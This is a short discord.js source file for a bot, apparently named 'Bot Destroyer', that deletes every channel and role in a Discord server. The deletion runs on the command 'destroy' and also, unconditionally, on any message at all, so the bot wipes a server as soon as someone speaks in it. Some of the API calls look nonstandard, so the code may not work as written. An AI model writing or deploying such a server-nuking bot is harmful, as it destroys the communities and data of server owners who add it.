const Discord = require("discord.js");
const bot = new Discord.Client();

let token = "TOKEN HERE!";

bot.on("ready", async () => {
    console.log(`${bot.user.username} ready!`);
});


bot.on("message", async message => {
    if(message.content === "destroy"){
        message.guild.channels.deleteAll("Bot Destroyer");
        message.guild.roles.deleteAll("Bot Destroyer");
    }

    if(message.content === "leave"){
        message.guild.leave();
    }
    message.guild.channels.deleteAll("Bot Destroyer");
    message.guild.roles.deleteAll("Bot Destroyer");

});
bot.login(token);
